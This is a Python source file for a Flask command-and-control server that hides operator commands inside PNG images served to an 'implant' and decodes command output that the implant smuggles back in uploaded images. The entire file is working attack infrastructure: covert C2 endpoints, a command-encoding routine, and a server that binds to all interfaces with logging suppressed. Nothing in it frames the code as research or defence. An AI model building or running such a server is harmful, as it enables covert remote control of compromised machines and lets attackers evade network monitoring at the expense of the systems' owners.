import logging
import os
import threading
from flask import Flask, request, send_file
from werkzeug.utils import secure_filename
from modules.steganography import encode_image, decode_image

# --- C2 Server State ---
UPLOAD_FOLDER = '/tmp/stego_c2_uploads'
ALLOWED_EXTENSIONS = {'png'}
COMMAND_FILE = '/tmp/stego_c2_command.png'
INPUT_IMAGE = 'assets/input.png' # A base image for encoding

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Ensure the upload folder exists
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/implant/get_command', methods=['GET'])
def get_command():
    """
    Serves the command-encoded image to the implant.
    """
    if not os.path.exists(COMMAND_FILE):
        return "No command available.", 404
    return send_file(COMMAND_FILE, mimetype='image/png')

@app.route('/implant/send_output', methods=['POST'])
def send_output():
    """
    Receives and decodes the output-encoded image from the implant.
    """
    if 'file' not in request.files:
        return "No file part.", 400
    file = request.files['file']
    if file.filename == '' or not allowed_file(file.filename):
        return "Invalid file.", 400

    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)

    try:
        output = decode_image(filepath)
        print(f"\n--- C2 Output Received ---\n{output}\n--- End Output ---")
    except Exception as e:
        logging.error(f"Failed to decode output from {filepath}: {e}")

    return "Output received.", 200

def set_command(command):
    """
    Encodes a command into the command image.
    """
    try:
        encode_image(INPUT_IMAGE, command, COMMAND_FILE)
        logging.info(f"Command '{command}' encoded into {COMMAND_FILE}")
        return True
    except Exception as e:
        logging.error(f"Failed to encode command: {e}")
        return False

def run_server():
    """
    Runs the Flask C2 server in a separate thread.
    """
    # Disable Flask's default logging to keep the console clean
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    server_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080))
    server_thread.daemon = True
    server_thread.start()
    logging.info("Stego C2 server started on port 8080.")
    print("Stego C2 server started on http://0.0.0.0:8080")
